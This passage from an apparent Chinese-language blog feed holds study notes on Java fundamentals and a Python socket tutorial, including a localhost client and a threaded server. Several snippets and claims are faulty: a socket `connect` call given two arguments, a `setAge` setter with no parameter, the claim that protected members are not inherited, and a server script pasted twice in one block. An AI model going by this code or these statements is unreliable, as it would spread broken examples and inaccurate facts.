...]];<br></code></pre></td></tr></table></figure><p><strong>一般使用公司域名倒置作为包名</strong></p><p>为了使用某一个包的成员我们可以使用<code>import</code>进行导入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> pk1[.pkg2[.pkg3 ...]];<br></code></pre></td></tr></table></figure><p>需要注意的是，<code>package</code>需要放在<code>import</code>上方</p><h3 id="使用其他类的规则">使用其他类的规则</h3><ul><li>使用同一个包中的类时，不需要导包</li><li>使用<code>java.lang</code>包中的类时，不需要导入</li><li>其他情况都需要导包</li><li>如果同时使用两个包中的同名类需要使用全类名</li></ul><h2 id="JavaDoc">JavaDoc</h2><p><code>javadoc</code>命令是用来生成自己<code>API</code>文档的</p><h3 id="参数信息">参数信息</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@author</span> 作者<br><span class="hljs-variable">@version</span> 版本号<br><span class="hljs-variable">@since</span> 指明需要最早使用的jdk版本<br><span class="hljs-variable">@param</span> 参数名<br><span class="hljs-variable">@return</span> 返回值<br><span class="hljs-variable">@throws</span> 异常抛出情况<br></code></pre></td></tr></table></figure><p>可以在<code>.java</code>所在的路径下使用<code>javadoc</code>来进行创建相关的<code>API</code>文档</p><h2 id="用户交互-Scanner">用户交互 Scanner</h2><p>与其他的语言不太一样的是，<code>Java</code>是需要使用<code>Scanner</code>创建一个扫描器对象，来用于接收键盘数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br>Scanner scanner = <span class="hljs-keyword">new</span> Scanner(System.in);<br></code></pre></td></tr></table></figure><h3 id="判断输入">判断输入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Scanner.hasNext()<br></code></pre></td></tr></table></figure><p>我们可以通过这个来进行判断用户是否输入</p><h3 id="接收数据">接收数据</h3><p>我们需要使用<code>next</code>方式进行接收</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">String</span> input = scanner.<span class="hljs-keyword">next</span>()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>当我们用完了<code>IO</code>类流后如果不关闭会一直占用资源，需要用完后就关掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">scanner.close();<br></code></pre></td></tr></table></figure><blockquote><p><code>next()</code>:<br>1、一定要读取到有效字符后才可以结束输入。<br>2、对输入有效字符之前遇到的空白，<code>next()</code>方法会自动将其去掉。</p><p>3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。</p><p>4、<code>next()</code>不能得到带有空格的字符串。<br><code>nextLine()</code>:<br>1、以<code>Enter</code>为结束符,也就是说<code>nextLine()</code>方法返回的是输入回车之前的所有字符</p><p>2、可以获得空白。</p></blockquote><h2 id="数组">数组</h2><p>首先必须声明数组变量，才能在程序中使用，数组声明通常有两种方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] num;<br><span class="hljs-keyword">int</span> num[]; <span class="hljs-comment">// 不推荐</span><br></code></pre></td></tr></table></figure><p><code>Java</code>通过使用<code>new</code>操作符来创建数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">num[] arrReVar = <span class="hljs-keyword">new</span> dataType[arraySize];<br></code></pre></td></tr></table></figure><p>数组对象本身是在堆中的</p><h3 id="稀疏数组">稀疏数组</h3><p>当一个数组中元素大部分是<code>0</code>或者是同一值的数组时，可以使用稀疏数组来保存改数组</p><p>大致就是一个数组，我们将其抽象为一个另一个数组，将数组中的不为<code>0</code>的的数据的坐标，值进行记录，然后进行保存。</p><p><img src="https://s2.loli.net/2022/09/29/ON7DWLy2BYwxfg8.jpg" alt=""></p><h3 id="字符串">字符串</h3><h4 id="StringBuilder">StringBuilder</h4><p><code>StringBuilder</code>对象：包含了两个方法，一个为<code>append()</code>另一个是<code>reverse()</code>,可以用于快速的拼接字符串和将字符串进行反转</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br></code></pre></td></tr></table></figure><p>其中可以包含为有参和无参两种方式进行实现，在括号内进行添加字符串即可创建有参构造</p><p>同时<code>StringBuilder</code>对象可以进行链式编程，直接后面加上一个<code>.</code>然后便可以继续添加后续的方法</p><h4 id="集合">集合</h4><p>集合的的关键字是<code>ArrayList</code>，定义方式为<code>ArraryList&lt;E&gt;</code>，E 代表非基本数据类型如<code>String</code>，e</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ArraryList&lt;String&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br></code></pre></td></tr></table></figure><p>对应的集合的方法主要有如下几个：</p><img src="https://s2.loli.net/2022/10/01/Lqu7tmyaTHbWQ6o.jpg" style="zoom: 67%;" /><h2 id="增强for循环">增强for循环</h2><p><code>Java5+</code>的特性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] numbers = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;; <span class="hljs-comment">// 创建了一个数组</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> x:numbers)&#123;<br><span class="hljs-comment">// XXX</span><br>&#125;<br></code></pre></td></tr></table></figure><p>使用这个方式相当于是从<code>numbers</code>中获取每一个成员，与<code>Python</code>的<code>for i in numbers:</code>相同</p><h2 id="方法">方法</h2><p><code>Java</code>中函数被称之为方法，是用于解决一类问题步骤的有序组合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> sum = add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>        System.out.println(sum);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>像上面的代码我们创建的函数需要加上一个<code>static</code>使其成为类成员，才能被我们的<code>main</code>方法进行调用</p><p>否则需要我们创建一个类对象，通过类对象进行获取对应的函数方法</p><h3 id="重载">重载</h3><p>方法的重载的规则:</p><ol><li>方法名称必须相同。</li><li>参数列表必须不同(个数不同、或类型不同、参数排列顺序不同等)。</li><li>方法的返回类型可以相同也可以不相同。</li><li>仅仅返回类型不同不足以成为方法的重载。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> sum1 = add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>        System.out.println(sum1);<br>        <span class="hljs-keyword">double</span> sum2 = add(<span class="hljs-number">1.0</span>,<span class="hljs-number">2.0</span>);<br>        System.out.println(sum2);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">double</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">double</span> a,<span class="hljs-keyword">double</span> b)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="命令行传参">命令行传参</h3><p>我们可以使用<code>main</code>中的<code>args</code>来实现<code>main</code>传参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;args.length;i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;args[&quot;</span> + i+ <span class="hljs-string">&quot;]&quot;</span> + args[i]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="可变参数">可变参数</h3><p>对于一个方法我们可能会有许多参数，我们不可能去一个个的重载，我们可以使用可变参数来进行传递多个参数</p><p>方法声明中，在指定参数类型后加一个省略号(…)，一个方法中只能指定一个可变参数，必须是方法的最后一个参数，任何普通的参数必须在它之前声明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        test(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ...i)</span></span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> n=<span class="hljs-number">0</span>; n &lt;i.length;n++)&#123;<br>            System.out.println(i[n]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类对象的创建">类对象的创建</h2><p>我们创建一个类，后需要通过实例化来进行使用，我们可以创建对应对象(使用<code>new</code>来进行默认的初始化以及对累中构造器的调用)</p><blockquote><p>使用<code>new</code>关键字本质是在调用构造器</p></blockquote><p>类中的构造器也称为构造方法，是在进行创建对象的时候必须要调用的，并且存在以下两个特点:</p><ul><li>必须和类的名字相同</li><li>必须没有返回值类型，也不能写<code>void</code></li></ul><blockquote><p>像 <code>C++</code> 中的构造以及析构函数，一旦定义了有参构造，无参就必须显示定义</p></blockquote><h3 id="属性私有">属性私有</h3><p>我们将属性设置为私有，使用<code>private</code>方式，我们获取到对应的数据需要使用<code>getSet</code>，使用<code>this</code>的方式来进行初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">return</span> age;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">setAge</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">this</span>.age = age;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用封装，可以避免程序直接访问，提高数据的安全性，以及提高系统的可维护性。</p><h3 id="继承">继承</h3><p>关键字：<code>extends</code>，意思是扩展，子类是父类的扩展</p><blockquote><p>需要注意的是<code>Java</code>中只有单继承，没有多继承</p></blockquote><p>子类可以继承父类的各种方法，子类不能继承父类私有项和保护项</p><blockquote><p><code>Java</code>中，所有的类默认都直接或者间接继承<code>Object</code>类</p></blockquote><p>子类使用父类中成员时，需要使用关键字<code>super</code></p><blockquote><p><code>super</code>调用父类的构造方法，必须在构造方法的第一个</p><p><code>super</code>必须只能出现在子类的方法或者构造方法中</p><p><code>super</code>和<code>this</code>不能同时调用构造方法</p></blockquote><h3 id="方法重写">方法重写</h3><p>父类的引用可以指向子类，对于方法的调用，只和左边定义的数据类型相关</p><p>方法相当于子类继承父类后将父类中的方法进行了重写</p><blockquote><p>与<code>C++</code>的虚函数与纯虚函数相似，此处略过</p></blockquote><h2 id="接口">接口</h2><p>接口是使用<code>interface</code>来进行定义</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> 接口名 </span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>接口不能实例化，接口和类之间是实现关系，通过<code>implements</code>关键字表示</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> 类名 <span class="hljs-keyword"><span class="hljs-keyword">implements</span> </span>接口名 </span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>接口的子类要么重写接口中的所有抽象方法，要么是抽象类</p><p>接口中成员变量的默认修饰符是<code>public</code>，接口没有构造方法，成员方法默认修饰符：<code>public abstract</code></p>]]></content>
    
    
    <categories>
      
      <category>Programming</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python Socket</title>
    <link href="/2022/09/23/Python%20Socket/"/>
    <url>/2022/09/23/Python%20Socket/</url>
    
    <content type="html"><![CDATA[<h2 id="是什么">是什么</h2><p>简单而言<code>socket</code>是一种网络编程需要我们编写服务端与客户端，我们可以简单的理解为客户端与服务器之间交互的方式实现手段之一。</p><p><code>Python</code>的<code>Socket</code>通信逻辑大致如下图：</p><img src="https://s2.loli.net/2022/09/24/CQyf6NUDHXtIKAT.png" style="zoom: 80%;" /><h2 id="怎么用">怎么用</h2><p><code>Python</code>肯定是需要我们导入包的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br></code></pre></td></tr></table></figure><blockquote><p>似乎这个是自带的？反正<code>pip install socket</code>没能安装，但是可以直接导入</p></blockquote><p>导入包之后我们需要使用<code>socket.socket()</code>方法来创建一个套接字</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">sk = socket.socket([family[, <span class="hljs-built_in">type</span>[, proto]]])<br></code></pre></td></tr></table></figure><p><strong>参数说明：</strong></p><ul><li><code>family</code>: 套接字家族，可以使<code>AF_UNIX</code>或者<code>AF_INET</code>。</li><li><code>type</code>: 套接字类型，根据是面向连接的还是非连接分为<code>SOCK_STREAM</code>或<code>SOCK_DGRAM</code>，也就是TCP和UDP的区别。</li><li><code>protocol</code>: 一般不填默认为0。</li></ul><p>或者直接<code>socket.socket()</code>，则全部使用默认值。</p><p>参数定义：</p><table><thead><tr><th>socket类型</th><th>描述</th></tr></thead><tbody><tr><td>socket.AF_UNIX</td><td>只能够用于单一的Unix系统进程间通信</td></tr><tr><td>socket.AF_INET</td><td>IPv4</td></tr><tr><td>socket.AF_INET6</td><td>IPv6</td></tr><tr><td>socket.SOCK_STREAM</td><td>流式socket , for TCP</td></tr><tr><td>socket.SOCK_DGRAM</td><td>数据报式socket , for UDP</td></tr><tr><td>socket.SOCK_RAW</td><td>原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。</td></tr><tr><td>socket.SOCK_SEQPACKET</td><td>可靠的连续数据包服务</td></tr><tr><td>创建TCP Socket：</td><td>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</td></tr><tr><td>创建UDP Socket：</td><td>s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</td></tr></tbody></table><p>创建后对应的对象后可以使用如下方法：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><strong>服务器端方法</strong></td><td></td></tr><tr><td><strong>s.bind()</strong></td><td>绑定地址<code>(host,port)</code>到套接字，在<code>AF_INET</code>下,以元组<code>(host,port)</code>的形式表示地址。</td></tr><tr><td><strong>s.listen(backlog)</strong></td><td>开始监听。<code>backlog</code>指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为 5 就可以了。</td></tr><tr><td><strong>s.accept()</strong></td><td>被动接受客户端连接,(阻塞式)等待连接的到来，并返回<code>(conn,address)</code>二元元组,其中conn是一个通信对象，可以用来接收和发送数据。<code>address</code>是连接客户端的地址。</td></tr><tr><td><strong>客户端方法</strong></td><td></td></tr><tr><td><strong>s.connect(address)</strong></td><td>客户端向服务端发起连接。一般<code>address</code>的格式为元组<code>(hostname,port)</code>，如果连接出错，返回<code>socket.error</code>错误。</td></tr><tr><td>s.connect_ex()</td><td><code>connect()</code>函数的扩展版本,出错时返回出错码,而不是抛出异常</td></tr><tr><td><strong>公共方法</strong></td><td></td></tr><tr><td><strong>s.recv(bufsize)</strong></td><td>接收数据，数据以<code>bytes</code>类型返回，<code>bufsize</code>指定要接收的最大数据量。</td></tr><tr><td><strong>s.send()</strong></td><td>发送数据。返回值是要发送的字节数量。</td></tr><tr><td><strong>s.sendall()</strong></td><td>完整发送数据。将数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回<code>None</code>，失败则抛出异常。</td></tr><tr><td>s.recvform()</td><td>接收<code>UDP</code>数据，与<code>recv()</code>类似，但返回值是<code>(data,address)</code>。其中<code>data</code>是包含接收的数据，<code>address</code>是发送数据的套接字地址。</td></tr><tr><td>s.sendto(data,address)</td><td>发送<code>UDP</code>数据，将数据<code>data</code>发送到套接字，<code>address</code>是形式为<code>(ipaddr，port)</code>的元组，指定远程地址。返回值是发送的字节数。</td></tr><tr><td><strong>s.close()</strong></td><td>关闭套接字，必须执行。</td></tr><tr><td>s.getpeername()</td><td>返回连接套接字的远程地址。返回值通常是元组<code>(ipaddr,port)</code></td></tr><tr><td>s.getsockname()</td><td>返回套接字自己的地址。通常是一个元组<code>(ipaddr,port)</code></td></tr><tr><td>s.setsockopt(level,optname,value)</td><td>设置给定套接字选项的值。</td></tr><tr><td>s.getsockopt(level,optname[.buflen])</td><td>返回套接字选项的值。</td></tr><tr><td>s.settimeout(timeout)</td><td>设置套接字操作的超时期，<code>timeout</code>是一个浮点数，单位是秒。值为<code>None</code>表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作(如<code>connect()</code>)</td></tr><tr><td>s.gettimeout()</td><td>返回当前超时期的值，单位是秒，如果没有设置超时期，则返回<code>None</code>。</td></tr><tr><td>s.fileno()</td><td>返回套接字的文件描述符。</td></tr><tr><td>s.setblocking(flag)</td><td>如果<code>flag</code>为 0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用<code>recv()</code>没有发现任何数据，或<code>send()</code>调用无法立即发送数据，那么将引起<code>socket.error</code>异常。</td></tr><tr><td>s.makefile()</td><td>创建一个与该套接字相关连的文件</td></tr></tbody></table><blockquote><p>常用方法已经加粗</p></blockquote><p><strong>注意事项：</strong></p><ul><li><p><code>Python3</code>以后，socket传递的都是<strong>bytes类型</strong>的数据，字符串需要先转换一下，<code>string.encode()</code>即可；另一端接收到的bytes数据想转换成字符串，只要<code>bytes.decode()</code>一下就可以。</p></li><li><p>在正常通信时，<code>connect()</code>、<code>accept()</code>和<code>recv()</code>方法都是阻塞的。所谓的阻塞，指的是程序会暂停在那，一直等到有数据过来。</p></li></ul><h2 id="简单创建-——-TCP模式">简单创建 —— TCP模式</h2><h3 id="用户端">用户端</h3><p>对于用户端，我们就只用创建一个套接字，进行链接服务器，通过<code>sendall()</code>进行发送到服务端即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> socket<br><br>s = socket.socket() <span class="hljs-comment"># 使用默认参数</span><br>s.connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">8080</span>) <span class="hljs-comment"># 发送到本地 8080 端口</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] you: &quot;</span>) <span class="hljs-comment"># 输入发送的信息</span><br>s.sendall(message.encode()) <span class="hljs-comment"># 发送信息</span><br>reply = s.recv(<span class="hljs-number">1024</span>).decode() <span class="hljs-comment"># 1024的缓冲区，进行获取返回数据</span><br><span class="hljs-built_in">print</span>(reply)<br>s.close() <span class="hljs-comment"># 关闭链接</span><br></code></pre></td></tr></table></figure><p>这个方式十分的简单，编写也没有什么难度，但是只能执行一次，随后便关闭了链接，与此同时对于多个客户端时上述脚本并不能很好的提供服务。因为<code>Python</code>发送的<code>Socket</code>默认是单进程单线程，只能同时出口一个链接请求。</p><p>如果需要实现一直保持链接状态我们可以加入一个<code>while(1)</code>进行循环，当用户输入指定内容后退出链接。</p><p>对于我们想要对多个客户端进行提供服务需要我们加入一个多线程，我们可以使用<code>Python</code>内置的<code>threading</code>模块，配合<code>socket</code>模块使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading        <span class="hljs-comment"># 导入线程模块</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">link_handler</span>(<span class="hljs-params">link, client</span>):</span>     <br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    该函数为线程需要执行的函数，负责具体的服务器和客户端之间的通信工作</span><br><span class="hljs-string">    :param link: 当前线程处理的连接</span><br><span class="hljs-string">    :param client: 客户端ip和端口信息，一个二元元组</span><br><span class="hljs-string">    :return: None</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;服务器开始接收来自[%s:%s]的请求....&quot;</span> % (client[<span class="hljs-number">0</span>], client[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># 利用一个死循环，保持和客户端的通信状态</span><br>        client_data = link.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-keyword">if</span> client_data == <span class="hljs-string">&quot;exit&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;结束与[%s:%s]的通信...&quot;</span> % (client[<span class="hljs-number">0</span>], client[<span class="hljs-number">1</span>]))<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;来自[%s:%s]的客户端向你发来信息：%s&quot;</span> % (client[<span class="hljs-number">0</span>], client[<span class="hljs-number">1</span>], client_data))<br>        link.sendall(<span class="hljs-string">&#x27;服务器已经收到你的信息&#x27;</span>.encode())<br>    link.close()<br><br><br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>sk = socket.socket()            <span class="hljs-comment"># 创建套接字</span><br>sk.bind(ip_port)                <span class="hljs-comment"># 绑定服务地址</span><br>sk.listen(<span class="hljs-number">5</span>)                    <span class="hljs-comment"># 监听连接请求</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;启动socket服务，等待客户端连接...&#x27;</span>)<br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading        <span class="hljs-comment"># 导入线程模块</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">link_handler</span>(<span class="hljs-params">link, client</span>):</span>     <br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    该函数为线程需要执行的函数，负责具体的服务器和客户端之间的通信工作</span><br><span class="hljs-string">    :param link: 当前线程处理的连接</span><br><span class="hljs-string">    :param client: 客户端ip和端口信息，一个二元元组</span><br><span class="hljs-string">    :return: None</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;服务器开始接收来自[%s:%s]的请求....&quot;</span> % (client[<span class="hljs-number">0</span>], client[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># 利用一个死循环，保持和客户端的通信状态</span><br>        client_data = link.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-keyword">if</span> client_data == <span class="hljs-string">&quot;exit&quot;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;结束与[%s:%s]的通信...&quot;</span> % (client[<span class="hljs-number">0</span>], client[<span class="hljs-number">1</span>]))<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;来自[%s:%s]的客户端向你发来信息：%s&quot;</span> % (client[<span class="hljs-number">0</span>], client[<span class="hljs-number">1</span>], client_data))<br>        link.sendall(<span class="hljs-string">&#x27;服务器已经收到你的信息&#x27;</span>.encode())<br>    link.close()<br><br><br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">8080</span>)<br>sk = socket.socket()            <span class="hljs-comment"># 创建套接字</span><br>sk.bind(ip_port)                <span class="hljs-comment"># 绑定服务地址</span><br>sk.listen(<span class="hljs-number">5</span>)                    <span class="hljs-comment"># 监听连接请求</span><br><br><span class="hljs-built_in">print</span>(<span 